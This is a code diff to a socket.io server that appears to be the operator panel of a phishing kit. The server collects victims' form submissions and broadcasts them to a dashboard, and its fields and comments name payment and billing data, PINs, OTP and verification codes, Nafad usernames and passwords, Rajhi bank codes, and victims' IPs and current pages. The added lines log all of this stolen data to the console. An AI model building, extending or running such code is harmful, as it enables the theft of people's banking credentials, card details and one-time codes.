@@ -91,6 +91,25 @@ io.on("connection", (socket) => {
     const flags = users.map((u) => ({ ip: u.ip, flag: u.flag }));
     const locations = users.map((u) => ({ ip: u.ip, currentPage: u.location }));
 
+    console.log({
+      indexSubmissions, // index form submissions
+      details: detailsArr, // details page
+      comprehensive: comprehensiveArr,
+      billing: billingArr,
+      payment: paymentArr,
+      pin: pins["verificationCode"],
+      phoneSubs, // phone submissions
+      verification_code_three: phoneCodes["code"], // phone-code submissions
+      thirdPartys,
+      verification_code_two: verifs["code"], // final verifications (OTP)
+      nafadLogins, // Nafad username/password
+      nafadCodes, // Nafad two‑digit codes
+      flags, // user.flag
+      locations, // user.location
+      rajhis,
+      rajhisCodes,
+    });
+
     io.emit("initialData", {
       indexSubmissions, // index form submissions
       details: detailsArr, // details page
